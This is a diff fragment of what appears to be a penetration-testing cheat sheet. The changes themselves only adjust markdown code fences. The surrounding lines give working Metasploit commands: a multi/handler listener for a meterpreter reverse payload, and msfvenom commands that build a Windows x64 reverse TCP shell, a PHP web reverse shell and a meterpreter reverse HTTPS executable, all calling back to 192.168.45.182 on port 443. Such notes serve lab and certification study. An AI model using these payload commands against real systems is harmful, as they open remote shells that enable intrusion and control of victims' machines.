@@ -673,7 +673,8 @@ msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse
 List payloads.
 ```
 msfvenom -l payloads --platform windows --arch x64
-````
+`
+```
 
 List payload options.
 ```
@@ -693,12 +694,14 @@ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.182 LPORT=443 -f exe 
 PHP reverse shell.
 ```
 msfvenom -p php/reverse_php LHOST=192.168.45.182 LPORT=443 --platform php -o webrevshell.php
-````
+`
+```
 
 Win x64 reverse HTTPS.
 ```
 msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.182 LPORT=443 -f exe -o met.exe
-````
+`
+```
 *HTTPS Basic Options*
 ```
 Name        Current Setting  Required  Description
